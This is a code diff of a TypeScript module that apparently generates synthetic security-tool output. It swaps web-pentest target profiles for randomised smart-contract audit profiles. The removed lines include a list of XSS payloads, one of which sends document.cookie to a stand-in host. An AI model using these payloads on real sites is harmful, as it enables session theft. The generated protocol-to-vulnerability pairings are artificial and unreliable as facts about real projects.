@@ -1,4 +1,4 @@
-// Shared types, data constants, and helper functions for output generators
+// Shared types, data constants, and helper functions for smart contract output generators
 
 export class SeededRNG {
   private seed: number;
@@ -34,25 +34,42 @@ export class SeededRNG {
   }
 }
 
-export interface TargetProfile {
-  ip: string;
-  domain: string;
-  openPorts: number[];
-  subdomains: string[];
-  directories: string[];
-  technologies: string[];
-  techHeaders: string[];
-  pageTitles: string[];
-  databases: DatabaseProfile;
-  injectableParams: string[];
-  reflectedParams: string[];
-  userCount: number;
+export interface ContractProfile {
+  protocolName: string;
+  chainId: number;
+  contractAddress: string;
+  contractName: string;
+  solidityVersion: string;
+  inheritanceChain: string[];
+  stateVariables: StateVar[];
+  externalFunctions: FuncDef[];
+  events: string[];
+  dependencies: string[];
+  vulnType: string;
+  affectedFunction: string;
+  missingCheck: string;
+  impactType: string;
+  severity: string;
+  exploitComplexity: "trivial" | "moderate" | "complex";
+  requiresFork: boolean;
+  requiresCapital: number;
+  pocType: "unit" | "fork" | "fuzz" | "invariant";
+  tvl: string;
+  tokenPrice: string;
+  affectedToken: string;
 }
 
-export interface DatabaseProfile {
+export interface StateVar {
   name: string;
-  versions: string[];
-  databases: string[];
+  type: string;
+  visibility: string;
+}
+
+export interface FuncDef {
+  name: string;
+  visibility: string;
+  modifiers: string[];
+  params: string[];
 }
 
 export interface OutputContext {
@@ -60,140 +77,209 @@ export interface OutputContext {
   generateDate(): string;
   generateUUID(): string;
   generateHex(length: number): string;
-  generateRandomUser(): { username: string; email: string; role: string; password_hash: string };
-  generateEnvFileOutput(targetProfile: TargetProfile): string;
-  timestamp(): string;
-  generateSqlPayload(param: string, technique: string, dbms: string): string;
-  generatePhone(): string;
   generateAddress(): string;
-  generateBase64(length: number): string;
-  generateAlphanumeric(length: number): string;
+  generateTxHash(): string;
+  generateBlockNumber(): number;
+  generateAmount(): string;
+  generateGasUsed(): number;
+  generateRandomAuditor(): { handle: string; firm: string };
+  generateTimestamp(): number;
 }
 
-export function generateTargetProfile(rng: SeededRNG): TargetProfile {
-  const backends = [
-    { techs: ["Node.js", "Express", "PM2"], headers: ["Express", "X-Powered-By: Express"], db: { name: "MongoDB", versions: ["6.0", "7.0", "5.0.14"], databases: ["admin", "local", "webapp", "production", "analytics", "logs"] } },
-    { techs: ["Node.js", "Express", "Redis"], headers: ["Express", "X-Powered-By: Express"], db: { name: "PostgreSQL", versions: [">= 14.0", ">= 15.0", "13.9"], databases: ["information_schema", "pg_catalog", "postgres", "webapp", "production"] } },
-    { techs: ["Python", "Django", "Gunicorn"], headers: ["gunicorn", "WSGIServer/0.2"], db: { name: "PostgreSQL", versions: [">= 14.0", ">= 16.0", "15.4"], databases: ["information_schema", "pg_catalog", "postgres", "django_app", "auth_db"] } },
-    { techs: ["Python", "Flask", "uWSGI"], headers: ["Werkzeug/2.3.7", "Python/3.11"], db: { name: "MySQL", versions: [">= 8.0", "8.0.35", "5.7.42"], databases: ["information_schema", "mysql", "performance_schema", "flask_app", "production"] } },
-    { techs: ["Java", "Spring Boot", "Tomcat"], headers: ["Apache-Coyote/1.1", "Apache Tomcat/9.0.65"], db: { name: "PostgreSQL", versions: [">= 13.0", ">= 15.0", "14.10"], databases: ["information_schema", "pg_catalog", "postgres", "enterprise", "spring_db"] } },
-    { techs: ["PHP", "Laravel", "Apache"], headers: ["Apache/2.4.52", "PHP/8.2.0"], db: { name: "MySQL", versions: [">= 8.0", "8.0.36", "5.7.40"], databases: ["information_schema", "mysql", "laravel_app", "production", "wordpress"] } },
-    { techs: ["Ruby", "Rails", "Puma"], headers: ["Puma", "X-Runtime"], db: { name: "PostgreSQL", versions: [">= 14.0", ">= 15.0", "16.1"], databases: ["information_schema", "pg_catalog", "postgres", "rails_production", "actioncable"] } },
-    { techs: ["Go", "Gin", "nginx"], headers: ["nginx/1.24.0", "Go-HTTP-Server"], db: { name: "PostgreSQL", versions: [">= 14.0", ">= 16.0", "15.5"], databases: ["information_schema", "pg_catalog", "postgres", "go_app", "sessions"] } },
-    { techs: ["ASP.NET", "Kestrel", "IIS"], headers: ["Microsoft-IIS/10.0", "X-AspNet-Version: 4.0"], db: { name: "Microsoft SQL Server", versions: ["2019", "2022", "2017"], databases: ["master", "tempdb", "model", "webapp", "Northwind"] } },
-    { techs: ["Python", "FastAPI", "uvicorn"], headers: ["uvicorn", "Python/3.12"], db: { name: "PostgreSQL", versions: [">= 15.0", ">= 16.0", "14.11"], databases: ["information_schema", "pg_catalog", "postgres", "fastapi_prod", "async_db"] } },
-  ];
+// ============================================================
+// Protocol Data
+// ============================================================
 
-  const backend = rng.pick(backends);
+const PROTOCOL_NAMES = [
+  "Alchemix", "ZeroLend", "Folks Finance", "Puffer Finance", "Lombard Finance",
+  "DeGate", "Fuel Network", "Celo", "BadgerDAO", "Aave", "Compound",
+  "Uniswap", "Curve", "SushiSwap", "Balancer", "Yearn",
+  "Convex", "Frax", "Lido", "Rocket Pool", "Eigenlayer",
+  "Saffron", "Ostium", "Shardeum", "Anvil", "IDEX",
+  "Jito", "Butter Protocol", "Acre", "ThunderNFT", "Swaylend",
+];
 
-  const allSubs = [
-    "api", "admin", "dev", "staging", "mail", "vpn", "cdn", "internal", "test",
-    "beta", "docs", "status", "help", "support", "portal", "git", "ci", "jenkins",
-    "grafana", "prometheus", "kibana", "elastic", "redis", "db", "backup",
-    "auth", "sso", "oauth", "app", "mobile-api", "ws", "graphql", "v2",
-    "crm", "erp", "hr", "billing", "payments", "webhook", "storage", "media",
-    "dashboard", "monitoring", "logs", "metrics", "config", "vault", "secrets",
-  ];
+const CONTRACT_NAMES = [
+  "Voter", "RevenueHandler", "PoolVoter", "OmnichainStaking", "RewardDistributor",
+  "Vault", "LendingPool", "Bridge", "Adapter", "Treasury",
+  "StakingManager", "Governor", "Timelock", "Token", "NFTMarketplace",
+  "LiquidationEngine", "PriceOracle", "FeeCollector", "Escrow", "MintManager",
+  "LiquidityPool", "SwapRouter", "PerpetualsManager", "InsuranceFund", "YieldOptimizer",
+];
 
-  const allDirs = [
-    "admin", "api", "api/v1", "api/v2", "backup", ".git", ".env", "config",
-    "uploads", "static", "assets", "images", "docs", "swagger", "graphql",
-    "health", "status", "metrics", "debug", "test", "phpinfo.php", "server-status",
-    "robots.txt", ".well-known", "sitemap.xml", "crossdomain.xml", "web.config",
-    "wp-admin", "wp-login.php", "administrator", "login", "register", "dashboard",
-    "console", "actuator", "actuator/env", "actuator/health", "__debug__",
-    ".git/config", ".svn", ".DS_Store", "package.json", "composer.json",
-    "node_modules", "vendor", "tmp", "log", "error_log", "access.log",
-  ];
+const TOKEN_NAMES = [
+  "FLUX", "ALCX", "zFLX", "veALCX", "ZERO", "zZERO", "vZERO",
+  "LBTC", "stBTC", "pBTC", "FUEL", "stFUEL", "celoCELO",
+  "LPX", "vLPX", "SOLID", "veSOLID", "BRG", "stkBRG",
+  "THUNDER", "veTHUNDER", "SWAY", "veSWAY", "ACRE", "vACRE",
+];
 
-  const allParams = ["id", "q", "search", "query", "user_id", "item", "page", "sort", "order", "filter", "category", "name", "file", "path", "url", "redirect", "callback", "next", "ref", "lang", "format", "type", "action", "cmd", "debug", "token", "api_key"];
+const CHAIN_DATA = [
+  { id: 1, name: "Ethereum", rpc: "https://eth.llamarpc.com", blockTime: 12 },
+  { id: 42161, name: "Arbitrum", rpc: "https://arb1.arbitrum.io/rpc", blockTime: 0.25 },
+  { id: 10, name: "Optimism", rpc: "https://mainnet.optimism.io", blockTime: 2 },
+  { id: 8453, name: "Base", rpc: "https://mainnet.base.org", blockTime: 2 },
+  { id: 137, name: "Polygon", rpc: "https://polygon-rpc.com", blockTime: 2 },
+  { id: 56, name: "BNB Chain", rpc: "https://bsc-dataseed.binance.org", blockTime: 3 },
+];
 
-  const allTitles = [
-    "Dashboard - Admin Panel", "Login Portal", "API Documentation",
-    "User Management", "Welcome", "Search Results", "Corporate Portal",
-    "Internal Tools", "Jenkins Dashboard", "Grafana Metrics",
-    "Application Home", "Account Settings", "Error Page",
-    "Forbidden", "Under Maintenance", "Dev Environment",
-  ];
+const SOLIDITY_VERSIONS = ["0.7.6", "0.8.0", "0.8.4", "0.8.10", "0.8.13", "0.8.17", "0.8.19", "0.8.20", "0.8.23", "0.8.24"];
+
+const INHERITANCE_CHAINS = [
+  ["Ownable", "ReentrancyGuard"],
+  ["OwnableUpgradeable", "ReentrancyGuardUpgradeable", "Initializable"],
+  ["Pausable", "AccessControl", "ERC20"],
+  ["UUPSUpgradeable", "AccessControlUpgradeable"],
+  ["Multicall", "ERC20Permit", "ERC20"],
+  ["Governor", "GovernorVotes", "GovernorVotesQuorumFraction", "GovernorTimelockControl"],
+  ["BaseBridge", "MessageRelay", "AccessControl"],
+  ["OracleAggregator", "PriceFeed", "Ownable"],
+];
+
+const STATE_VAR_TEMPLATES = [
+  { name: "totalSupply", type: "uint256", visibility: "public" },
+  { name: "balances", type: "mapping(address => uint256)", visibility: "public" },
+  { name: "owner", type: "address", visibility: "public" },
+  { name: "paused", type: "bool", visibility: "public" },
+  { name: "rewardIndex", type: "uint256", visibility: "public" },
+  { name: "accRewardPerShare", type: "uint256", visibility: "public" },
+  { name: "userInfo", type: "mapping(address => UserInfo)", visibility: "public" },
+  { name: "stakingToken", type: "IERC20", visibility: "public" },
+  { name: "rewardToken", type: "IERC20", visibility: "public" },
+  { name: "epoch", type: "uint256", visibility: "public" },
+  { name: "lockEndTime", type: "uint256", visibility: "public" },
+  { name: "votingPower", type: "mapping(address => uint256)", visibility: "public" },
+  { name: "delegatedAmount", type: "mapping(address => uint256)", visibility: "public" },
+  { name: "bridgeNonce", type: "mapping(uint256 => uint256)", visibility: "public" },
+  { name: "priceFeed", type: "IPriceOracle", visibility: "public" },
+  { name: "feeRate", type: "uint256", visibility: "public" },
+  { name: "treasury", type: "address", visibility: "public" },
+  { name: "implementation", type: "address", visibility: "private" },
+];
+
+const FUNC_TEMPLATES = [
+  { name: "stake", visibility: "external", modifiers: ["nonReentrant"], params: ["uint256 amount"] },
+  { name: "withdraw", visibility: "external", modifiers: ["nonReentrant"], params: ["uint256 amount"] },
+  { name: "claim", visibility: "external", modifiers: [], params: [] },
+  { name: "poke", visibility: "external", modifiers: [], params: ["uint256 tokenId"] },
+  { name: "vote", visibility: "external", modifiers: [], params: ["address[] calldata pools", "uint256[] calldata weights"] },
+  { name: "delegate", visibility: "external", modifiers: [], params: ["address delegatee", "uint256 amount"] },
+  { name: "execute", visibility: "external", modifiers: ["onlyGovernor"], params: ["address target", "uint256 value", "bytes calldata data"] },
+  { name: "bridge", visibility: "external", modifiers: [], params: ["uint256 destChainId", "address recipient", "uint256 amount"] },
+  { name: "receiveMessage", visibility: "external", modifiers: [], params: ["bytes calldata payload", "bytes calldata proof"] },
+  { name: "mint", visibility: "external", modifiers: ["onlyMinter"], params: ["address to", "uint256 amount"] },
+  { name: "setPrice", visibility: "external", modifiers: ["onlyOracle"], params: ["address token", "uint256 price"] },
+  { name: "liquidate", visibility: "external", modifiers: [], params: ["address borrower", "uint256 debtToCover"] },
+];
+
+const DEPENDENCIES = [
+  "@openzeppelin/contracts/token/ERC20/IERC20.sol",
+  "@openzeppelin/contracts/access/Ownable.sol",
+  "@openzeppelin/contracts/security/ReentrancyGuard.sol",
+  "@openzeppelin/contracts/utils/math/SafeMath.sol",
+  "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol",
+  "@openzeppelin/contracts-upgradeable/access/AccessControlUpgradeable.sol",
+  "@openzeppelin/contracts/governance/Governor.sol",
+  "forge-std/Test.sol",
+  "forge-std/console.sol",
+  "solmate/auth/Owned.sol",
+];
+
+const AUDITOR_HANDLES = [
+  "Pashov Audit Group", "Trail of Bits", "OpenZeppelin", "Cyfrin", "Code4rena",
+  "Sherlock", "Consensys Diligence", "Quantstamp", "Hexens", "Sigma Prime",
+  "OtterSec", "Cantina", "Halborn", "Spearbit", "ZachObront",
+  "Codehawks", "0x52", "Trust Security", "MixBytes", "Recon Audits",
+];
+
+const TVL_VALUES = ["$5M", "$12M", "$23M", "$45M", "$67M", "$89M", "$120M", "$250M", "$500M", "$1.2B", "$2.5B"];
+const TOKEN_PRICES = ["$0.0034", "$0.12", "$0.45", "$1.23", "$2.87", "$5.67", "$12.34", "$45.00", "$123.45", "$1,234.56"];
+const SEVERITY_LEVELS = ["Critical", "High", "Medium", "Low", "Informational"];
+const EXPLOIT_COMPLEXITIES: Array<"trivial" | "moderate" | "complex"> = ["trivial", "moderate", "complex"];
+const POC_TYPES: Array<"unit" | "fork" | "fuzz" | "invariant"> = ["unit", "fork", "fuzz", "invariant"];
+const IMPACT_TYPES = [
+  "unlimited minting", "fund drainage", "governance takeover", "privilege escalation",
+  "denial of service", "permanent fund lock", "price manipulation", "fee bypass",
+  "reward inflation", "collateral liquidation", "oracle manipulation", "reentrancy drain",
+];
+const VULN_TYPES = [
+  "unauthorized-mint", "oracle-manipulation", "reentrancy", "access-control-bypass",
+  "integer-overflow", "rounding-precision", "signature-replay", "storage-collision",
+  "logic-error", "fee-bypass", "initialization-missing", "timelock-bypass",
+  "cross-chain-replay", "dos-griefing", "mev-front-running", "decimal-mismatch",
+];
+
+// ============================================================
+// Generator Functions
+// ============================================================
+
+export function generateContractProfile(rng: SeededRNG, vulnType?: string): ContractProfile {
+  const protocolName = rng.pick(PROTOCOL_NAMES);
+  const contractName = rng.pick(CONTRACT_NAMES);
+  const chainData = rng.pick(CHAIN_DATA);
+  const tokenName = rng.pick(TOKEN_NAMES);
+
+  const nStateVars = rng.int(6, 12);
+  const nFuncs = rng.int(4, 8);
 
   return {
-    ip: `${rng.pick([10, 172, 192])}.${rng.int(0, 255)}.${rng.int(0, 255)}.${rng.int(1, 254)}`,
-    domain: "", // set by caller
-    openPorts: rng.pickN([21, 22, 25, 53, 80, 110, 143, 443, 445, 993, 995, 1433, 1521, 2049, 3000, 3306, 3389, 5432, 5900, 6379, 8000, 8080, 8443, 8888, 9090, 9200, 9300, 27017], rng.int(4, 12)),
-    subdomains: rng.pickN(allSubs, rng.int(8, 25)),
-    directories: rng.pickN(allDirs, rng.int(8, 20)),
-    technologies: backend.techs,
-    techHeaders: backend.headers,
-    pageTitles: rng.pickN(allTitles, rng.int(3, 8)),
-    databases: backend.db,
-    injectableParams: rng.pickN(allParams, rng.int(2, 6)),
-    reflectedParams: rng.pickN(allParams, rng.int(2, 5)),
-    userCount: rng.int(50, 100000),
+    protocolName,
+    chainId: chainData.id,
+    contractAddress: `0x${generateHex(rng, 40)}`,
+    contractName,
+    solidityVersion: rng.pick(SOLIDITY_VERSIONS),
+    inheritanceChain: rng.pick(INHERITANCE_CHAINS),
+    stateVariables: rng.pickN(STATE_VAR_TEMPLATES, nStateVars).map(v => ({ ...v })),
+    externalFunctions: rng.pickN(FUNC_TEMPLATES, nFuncs).map(f => ({ ...f })),
+    events: rng.pickN(["Staked", "Withdrawn", "RewardClaimed", "Voted", "Bridged", "Minted", "Burned", "Liquidated", "PriceUpdated", "OwnershipTransferred"], rng.int(3, 6)),
+    dependencies: rng.pickN(DEPENDENCIES, rng.int(3, 6)),
+    vulnType: vulnType || rng.pick(VULN_TYPES),
+    affectedFunction: rng.pick(FUNC_TEMPLATES).name + "()",
+    missingCheck: rng.pick(["onlyNewEpoch modifier", "access control modifier", "zero address check", "rate limit validation", "signature uniqueness check", "chainId binding", "overflow protection", "reentrancy guard"]),
+    impactType: rng.pick(IMPACT_TYPES),
+    severity: rng.pick(SEVERITY_LEVELS),
+    exploitComplexity: rng.pick(EXPLOIT_COMPLEXITIES),
+    requiresFork: rng.bool(0.6),
+    requiresCapital: rng.pick([0, 0, 0, 100, 1000, 10000, 100000]),
+    pocType: rng.pick(POC_TYPES),
+    tvl: rng.pick(TVL_VALUES),
+    tokenPrice: rng.pick(TOKEN_PRICES),
+    affectedToken: tokenName,
   };
 }
 
-export const PORT_SERVICES: Record<number, { service: string; versions: string[] }> = {
-  21: { service: "ftp", versions: ["vsftpd 3.0.5", "ProFTPD 1.3.8", "Pure-FTPd 1.0.50"] },
-  22: { service: "ssh", versions: ["OpenSSH 8.9p1", "OpenSSH 9.3p1", "OpenSSH 8.2p1", "OpenSSH 9.6p1"] },
-  25: { service: "smtp", versions: ["Postfix", "Exim 4.96", "Sendmail 8.17"] },
-  53: { service: "domain", versions: ["ISC BIND 9.18.12", "dnsmasq 2.89", "PowerDNS 4.8.0"] },
-  80: { service: "http", versions: ["nginx 1.24.0", "Apache httpd 2.4.57", "Apache httpd 2.4.52", "nginx 1.22.1", "Microsoft IIS 10.0", "lighttpd 1.4.71"] },
-  110: { service: "pop3", versions: ["Dovecot pop3d", "Cyrus pop3d"] },
-  143: { service: "imap", versions: ["Dovecot imapd", "Cyrus imapd 3.8.0"] },
-  443: { service: "ssl/http", versions: ["nginx 1.24.0", "Apache httpd 2.4.57", "nginx 1.22.1", "Apache httpd 2.4.52", "Node.js Express", "Kestrel"] },
-  445: { service: "smb", versions: ["Samba smbd 4.18", "Windows Server 2022"] },
-  1433: { service: "ms-sql-s", versions: ["Microsoft SQL Server 2019", "Microsoft SQL Server 2022"] },
-  1521: { service: "oracle", versions: ["Oracle TNS listener 19c", "Oracle TNS listener 21c"] },
-  3000: { service: "http", versions: ["Node.js Express", "Grafana v10.2.0", "Gitea 1.21.0", "Node.js (Koa)"] },
-  3306: { service: "mysql", versions: ["MySQL 8.0.35", "MySQL 8.0.36", "MySQL 5.7.42", "MariaDB 10.11.6"] },
-  3389: { service: "ms-wbt-server", versions: ["Microsoft Terminal Services"] },
-  5432: { service: "postgresql", versions: ["PostgreSQL 15.4", "PostgreSQL 16.1", "PostgreSQL 14.10", "PostgreSQL 13.13"] },
-  5900: { service: "vnc", versions: ["VNC (protocol 3.8)", "VNC (protocol 4.0)"] },
-  6379: { service: "redis", versions: ["Redis 7.2.3", "Redis 7.0.15", "Redis 6.2.14"] },
-  8000: { service: "http", versions: ["Python/3.11 aiohttp/3.9", "uvicorn", "Django dev server"] },
-  8080: { service: "http-proxy", versions: ["Apache Tomcat 9.0.83", "Apache Tomcat 10.1.17", "Jenkins 2.426", "WildFly 30.0"] },
-  8443: { service: "ssl/http", versions: ["Apache Tomcat 9.0.83", "nginx 1.24.0", "Jetty 11.0.18"] },
-  8888: { service: "http", versions: ["Jupyter Notebook", "PHP built-in server", "aiohttp 3.9"] },
-  9090: { service: "http", versions: ["Prometheus", "Cockpit web service", "Zeus Admin Server"] },
-  9200: { service: "http", versions: ["Elasticsearch 8.11.3", "Elasticsearch 7.17.16", "OpenSearch 2.11.0"] },
-  9300: { service: "vrace", versions: ["Elasticsearch node-to-node"] },
-  27017: { service: "mongodb", versions: ["MongoDB 7.0.4", "MongoDB 6.0.12", "MongoDB 5.0.23"] },
-};
+function generateHex(rng: SeededRNG, length: number): string {
+  const chars = "0123456789abcdef";
+  return Array.from({ length }, () => chars[Math.floor(rng.next() * 16)]).join("");
+}
 
-export const NUCLEI_FINDINGS = [
-  { id: "CVE-2021-44228", severities: ["critical"], protocol: "http", paths: ["/api/log4j", "/admin", "/api"] },
-  { id: "CVE-2023-44487", severities: ["high"], protocol: "http", paths: ["/", "/api"] },
-  { id: "CVE-2024-21762", severities: ["critical"], protocol: "http", paths: ["/remote/logincheck"] },
-  { id: "git-config", severities: ["medium", "high"], protocol: "http", paths: ["/.git/config", "/.git/HEAD"] },
-  { id: "exposed-env", severities: ["high", "critical"], protocol: "http", paths: ["/.env", "/config/.env"] },
-  { id: "apache-status", severities: ["info", "low"], protocol: "http", paths: ["/server-status", "/server-info"] },
-  { id: "open-redirect", severities: ["medium"], protocol: "http", paths: ["/redirect?url=", "/login?next=", "/auth?return="] },
-  { id: "cors-misconfig", severities: ["high", "medium"], protocol: "http", paths: ["/api/v1/users", "/api/config", "/api"] },
-  { id: "jwt-none-algorithm", severities: ["high", "critical"], protocol: "http", paths: ["/api/auth", "/auth/verify"] },
-  { id: "spring-actuator", severities: ["high", "medium"], protocol: "http", paths: ["/actuator", "/actuator/env", "/actuator/health"] },
-  { id: "graphql-introspection", severities: ["medium", "info"], protocol: "http", paths: ["/graphql", "/api/graphql"] },
-  { id: "phpinfo", severities: ["low", "medium"], protocol: "http", paths: ["/phpinfo.php", "/info.php"] },
-  { id: "directory-listing", severities: ["low", "medium"], protocol: "http", paths: ["/uploads/", "/backup/", "/images/"] },
-  { id: "swagger-ui-exposed", severities: ["info", "low"], protocol: "http", paths: ["/swagger-ui.html", "/api-docs", "/swagger.json"] },
-  { id: "wordpress-xmlrpc", severities: ["medium"], protocol: "http", paths: ["/xmlrpc.php"] },
-  { id: "crlf-injection", severities: ["medium", "high"], protocol: "http", paths: ["/api/redirect", "/callback"] },
-  { id: "host-header-injection", severities: ["medium"], protocol: "http", paths: ["/", "/reset-password"] },
-  { id: "ssl-weak-cipher", severities: ["medium", "low"], protocol: "ssl", paths: [":443", ":8443"] },
-  { id: "missing-security-headers", severities: ["info", "low"], protocol: "http", paths: ["/", "/api"] },
-  { id: "default-credentials", severities: ["high", "critical"], protocol: "http", paths: ["/admin/login", "/manager/html", "/jenkins"] },
-  { id: "s3-bucket-listing", severities: ["high"], protocol: "http", paths: ["/"] },
-  { id: "exposed-debug-endpoint", severities: ["high", "critical"], protocol: "http", paths: ["/__debug__", "/debug/vars", "/debug/pprof"] },
-];
+export function generateAddress(rng: SeededRNG): string {
+  return `0x${generateHex(rng, 40)}`;
+}
 
-export const XSS_PAYLOADS = [
-  `"><svg/onload=alert(1)>`,
-  `<img src=x onerror=alert(document.cookie)>`,
-  `<details open ontoggle=alert(1)>`,
-  `javascript:alert(1)//`,
-  `'-alert(1)-'`,
-  `<script>alert(document.domain)</script>`,
-  `\"><img src=x onerror=fetch('//evil.com/?c='+document.cookie)>`,
-  `{{constructor.constructor('return this')().alert(1)}}`,
-  `<input onfocus=alert(1) autofocus>`,
-  `<marquee onstart=alert(1)>`,
-];
+export function generateTxHash(rng: SeededRNG): string {
+  return `0x${generateHex(rng, 64)}`;
+}
+
+export function generateBlockNumber(rng: SeededRNG): number {
+  return rng.int(18000000, 20000000);
+}
+
+export function generateAmount(rng: SeededRNG): string {
+  const amounts = ["0.001 ether", "0.01 ether", "0.1 ether", "1 ether", "10 ether", "100 ether", "1000 ether", "1000000000000000000", "10000000000000000000", "100000000000000000000"];
+  return rng.pick(amounts);
+}
+
+export function generateGasUsed(rng: SeededRNG): number {
+  return rng.int(21000, 2000000);
+}
+
+export function generateRandomAuditor(rng: SeededRNG): { handle: string; firm: string } {
+  const firm = rng.pick(AUDITOR_HANDLES);
+  const handles = ["0x" + generateHex(rng, 4).toLowerCase(), "auditor_" + generateHex(rng, 3), "sec_" + generateHex(rng, 4), rng.pick(["whitehat", "researcher", "warden"]) + rng.int(1, 9999)];
+  return { handle: rng.pick(handles), firm };
+}
+
+export function generateTimestamp(rng: SeededRNG): number {
+  return rng.int(1700000000, 1720000000);
+}
